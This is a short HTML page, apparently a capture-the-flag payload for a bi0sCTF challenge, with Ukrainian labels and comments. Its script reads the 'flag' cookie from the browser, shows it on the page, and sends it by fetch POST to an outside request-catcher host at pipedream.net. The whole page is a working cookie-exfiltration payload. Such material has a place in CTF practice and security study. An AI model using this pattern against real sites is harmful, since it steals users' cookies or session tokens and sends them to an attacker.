<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Cookie Reader Demo</title>
</head>
<body>
  <h1>Зчитування кукі "flag"</h1>
  <p id="flag-value">Значення не знайдено</p>

  <script>
    function getCookie(name) {
      const value = `; ${document.cookie}`;
      const parts = value.split(`; ${name}=`);
      if (parts.length === 2) return parts.pop().split(';').shift();
      return null;
    }

    const flag = getCookie('flag');
    const display = document.getElementById('flag-value');
    if (flag) {
      display.innerText = `flag = ${flag}`;

      // Відправляємо кукі на ловильний сервер
      fetch('https://eomp5b5q7qo9g0s.m.pipedream.net', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ flag: `bi0sCTF{${flag}}` })

      });
    } else {
      display.innerText = 'Кукі "flag" не знайдено';
    }
  </script>
</body>
</html>
